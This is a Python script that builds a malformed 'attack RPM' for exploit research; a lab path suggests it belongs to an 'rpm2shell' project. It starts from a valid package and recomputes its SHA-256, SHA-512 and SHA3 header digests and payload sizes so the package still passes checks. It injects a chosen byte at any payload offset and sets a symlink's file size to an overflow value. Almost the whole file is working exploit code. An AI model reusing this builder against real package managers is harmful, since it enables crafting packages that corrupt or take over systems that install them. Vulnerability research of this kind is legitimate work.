#!/usr/bin/env python3
"""Throwaway: build an attack RPM with one chosen byte at arbitrary payload
offset.  Usage: mkredirect.py LEN IDX VAL OUT.rpm"""
import hashlib, importlib.util, struct, sys
from pathlib import Path

HERE = Path('/home/mesh-home/mishe-tauftauf2shell/lab/frontier/rpm2shell/real')
spec = importlib.util.spec_from_file_location('mk', HERE / 'make-attack.py')
mk = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mk)

total, idx, val, out = int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3], 0), sys.argv[4]
blob = bytearray((HERE / 'safe.rpm').read_bytes())
sig_entries, _, _, sig_end = mk.header_at(blob, 96)
main_at = (sig_end + 7) & ~7
entries, data, data_size, payload_at = mk.header_at(blob, main_at)

mode_type, mode_off, mode_count = entries[1030]
modes = struct.unpack_from(f">{mode_count}h", blob, data + mode_off)
import stat
links = [i for i, m in enumerate(modes) if stat.S_ISLNK(m & 0xFFFF)]
assert len(links) == 1
size_type, size_off, size_count = entries[5008]
size_at = data + size_off + links[0] * 8

def refresh(payload):
    global blob
    for tag in (5112, 5113):
        kind, off, count = entries[tag]
        struct.pack_into('>Q', blob, data + off, len(payload))
    for tag, digest in (
        (5092, hashlib.sha256(payload).hexdigest()),
        (5097, hashlib.sha256(payload).hexdigest()),
        (5121, hashlib.sha512(payload).hexdigest()),
        (5122, hashlib.sha512(payload).hexdigest()),
        (5123, hashlib.sha3_256(payload).hexdigest()),
        (5124, hashlib.sha3_256(payload).hexdigest()),
    ):
        kind, off, count = entries[tag]
        old = mk.string_at(blob, data + off, data + data_size)
        assert len(old) == len(digest)
        blob[data + off:data + off + len(digest)] = digest.encode()
    blob = blob[:payload_at] + payload

payload_data = bytearray(b'MISHE-RPM!!' + b'A' * (total - 11))
assert 0 <= idx < total
payload_data[idx] = val
refresh(mk.newc_payload(bytes(payload_data)))
struct.pack_into('>Q', blob, size_at, 0xFFFFFFFFFFFFFFFF)
blob = blob.replace(b'/opt/', b'/tmp/')
Path(out).write_bytes(blob)
print(f'attack len={total} idx={idx:#x} val={val:#x} sha256={hashlib.sha256(blob).hexdigest()}')
